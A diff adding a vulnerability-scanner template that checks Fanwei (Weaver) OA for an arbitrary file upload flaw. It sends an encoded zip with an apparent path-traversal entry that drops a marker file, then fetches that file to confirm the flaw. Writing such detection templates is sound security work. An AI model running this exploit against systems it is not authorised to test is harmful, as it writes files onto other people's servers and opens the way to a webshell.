@@ -1,0 +1,39 @@
+id: ecology-weaver_common-fileUpload
+info:
+  name: Fanwei OA weaver.common.Ctrl Arbitrary File Upload
+  author:
+  - l0ne1y
+  description: |-
+    Fanwei OA weaver.common.Ctrl Arbitrary File Upload
+    Web programs often contain file upload features, such as avatar uploads, image uploads, and attachment uploads. Since web middleware executes files with specific extensions (asp, php, cgi, aspx, jsp, etc.) based on user requests, if the file upload functionality does not restrict uploaded file extensions and allows executable files with extensions such as "asp, php, cgi, aspx, jsp, html" to be uploaded, attackers can exploit this vulnerability to upload malicious executable files to run malicious code, such as file read/write and command execution, thereby directly taking control of the server. In this vulnerability, attackers can upload a webshell file through the vulnerability to control the server.
+  severity: high
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1 == 200
+    - contains(body_2, "BugTest") && status_code_2 == 200
+  matchers-condition: and
+  raw:
+  - |+
+    POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+    Content-Disposition: form-data; name="file"; filename="XasdaASA.zip"
+    Content-Type: application/zip
+
+    {{shellcode}}
+    -----WebKitFormBoundaryFy3iNVBftjP6IOwo--
+
+  - |
+    GET /cloudstore/XasdaASA.txt HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  shellcode: '{{hex_decode(base64_decode("NTA0QjAzMDQxNDAwMDAwMDA4MDBEQTdCRDg1NDJGODIwQzY3MDkwMDAwMDAwNzAwMDAwMDE1MDAwMDAwMkUyRTJGMkUyRTJGMkUyRTJGNTg2MTczNjQ2MTQxNTM0MTJFNzQ3ODc0NzMyQTREMEY0OTJEMkUwMTAwNTA0QjAxMDIxNDAwMTQwMDAwMDAwODAwREE3QkQ4NTQyRjgyMEM2NzA5MDAwMDAwMDcwMDAwMDAxNTAwMDAwMDAwMDAwMDAwMDAwMDAwMDA4MDAxMDAwMDAwMDAyRTJFMkYyRTJFMkYyRTJFMkY1ODYxNzM2NDYxNDE1MzQxMkU3NDc4NzQ1MDRCMDUwNjAwMDAwMDAwMDEwMDAxMDA0MzAwMDAwMDNDMDAwMDAwMDAwMA=="))}}'
